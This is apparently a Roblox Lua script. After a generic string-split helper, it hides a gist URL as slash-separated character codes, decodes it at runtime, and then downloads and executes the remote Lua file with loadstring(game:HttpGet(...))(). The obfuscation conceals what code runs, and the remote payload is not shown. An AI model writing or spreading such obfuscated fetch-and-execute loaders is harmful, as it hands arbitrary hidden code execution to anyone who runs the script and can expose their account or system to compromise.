function split(inputstr, sep)
   if sep == nil then
      sep = "%s"
   end
   local t={}
   for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
      table.insert(t, str)
   end
   return t
end

local hey = "104/116/116/112/115/58/47/47/103/105/115/116/46/103/105/116/104/117/98/117/115/101/114/99/111/110/116/101/110/116/46/99/111/109/47/68/101/101/122/45/78/117/116/115/52/52/53/47/99/54/97/54/54/98/52/50/52/51/56/102/102/49/48/102/56/98/99/48/98/52/101/48/101/57/51/49/55/52/102/99/47/114/97/119/47/102/53/50/102/49/100/53/49/100/99/53/56/99/50/100/98/51/52/51/50/102/99/100/100/55/98/56/102/102/97/98/98/102/98/97/49/98/99/57/100/47/103/115/100/103/115/100/103/100/115/103/46/108/117/97/"
local test = ""
for i,v in pairs(split(hey,"/")) do
ph = string.char(v)
test = test..ph
end


loadstring(game:HttpGet(test))()
